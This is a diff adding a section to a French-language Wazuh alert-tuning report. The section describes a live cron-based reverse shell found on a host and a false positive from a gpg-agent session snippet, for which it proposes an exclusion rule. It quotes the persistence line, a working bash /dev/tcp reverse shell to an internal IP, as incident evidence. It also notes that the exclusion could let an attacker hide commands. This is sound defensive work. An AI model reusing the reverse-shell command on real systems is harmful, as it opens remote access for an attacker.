@@ -338,3 +338,65 @@ Au passage, les 7 contrôles négatifs de `test-detection-rules.sh` attendaient
 `80792` et obtenaient `80700` (« Audit: Messages grouped. »). Vérifié sur le
 ruleset d'avant ces changements : l'écart préexistait, c'est le ruleset natif
 Wazuh qui a changé de règle fourre-tout. Attentes corrigées.
+
+## 7. Deux découvertes en vérifiant l'effet du déploiement
+
+Les familles traitées ci-dessus sont muettes depuis le restart du manager
+(14:58:03 UTC) : 0 alerte sur 100653, 100760, 100643, 100901, et les dernières
+100645 / 100711 datent de 14:53 et 14:55, donc d'avant. Mais le comptage a
+révélé deux choses qui n'étaient pas dans le périmètre initial.
+
+### a. Un reverse shell actif toutes les minutes sur `debian2` — 91 % du bruit HIGH
+
+Ce n'est pas un faux positif. Sur `debian2` (192.168.30.46), la crontab de
+l'utilisateur `devops` (uid 1002) contient :
+
+```
+* * * * * /bin/bash -i >& /dev/tcp/192.168.30.5/4444 0>&1
+```
+
+Vérifié en SSH le 2026-08-01, dans `/var/spool/cron/crontabs/devops`. Il
+s'exécute depuis le 2026-07-29 et produit **6 760 alertes de niveau 12 sur les
+dernières 24 h — 91 % de tout le volume HIGH** (le même événement est vu trois
+fois : par l'agent de `debian2` et par les deux capteurs Proxmox).
+
+C'est la persistance de la campagne du 2026-07-29, jamais nettoyée. Les cases
+60/61/62 ont été clos le 2026-08-01 alors que l'implant, lui, bat toujours.
+**À retirer** (`crontab -u devops -r` ou édition de la ligne) — et ce n'est pas
+une whitelist : tant que la crontab est là, taire l'alerte reviendrait à ne plus
+voir la seule chose qui signale l'implant.
+
+Constat de fond au passage : la remédiation autonome isole, bloque une IP,
+désactive un compte — elle **ne supprime pas une persistance**. Un case peut
+donc être clos « remédié » avec le mécanisme de retour de l'attaquant intact.
+
+### b. FP 100634 — la valeur de `SSH_AUTH_SOCK` prise pour un chemin tmpfs
+
+198 alertes sur 267 (4 jours) portent ce motif :
+
+```
+sh -c - SSH_AUTH_SOCK=/run/user/0/gnupg/S.gpg-agent.ssh
+[ -z "$(gpgconf --list-options gpg-agent | awk -F: '/^enable-ssh-support:/{print$10}')" ] || systemctl --user set-environment "$@"
+```
+
+C'est le snippet `gpg-agent` joué à chaque ouverture de session (donc à chaque
+`ssh` d'administration). La règle matche parce que son `<regex>` cherche
+`/run/user/\d+/` **n'importe où dans le log** : ici le chemin n'est pas celui
+d'un script en tmpfs, c'est la **valeur d'une variable d'environnement**.
+
+Exclusion possible, non appliquée faute d'avoir été proposée avant :
+
+```xml
+<rule id="100636" level="0">
+  <if_sid>100634</if_sid>
+  <field name="audit.exe" type="pcre2">/(?:sh|dash|bash)$</field>
+  <regex type="pcre2">SSH_AUTH_SOCK=/run/user/\d+/gnupg/S\.gpg-agent\.ssh</regex>
+  <description>Exclusion 100634: gpg-agent session snippet, tmpfs path is an env value not a script</description>
+</rule>
+```
+
+Réserve honnête : la chaîne exclue est dans l'argv, donc contrôlable par un
+attaquant qui l'ajouterait à sa ligne de commande pour se cacher. Le correctif
+propre serait que 100634 ne matche pas un chemin tmpfs apparaissant dans une
+affectation `CLE=valeur` — plus juste, mais plus délicat à écrire en pcre2 sur
+le `full_log`. À arbitrer avant d'appliquer.
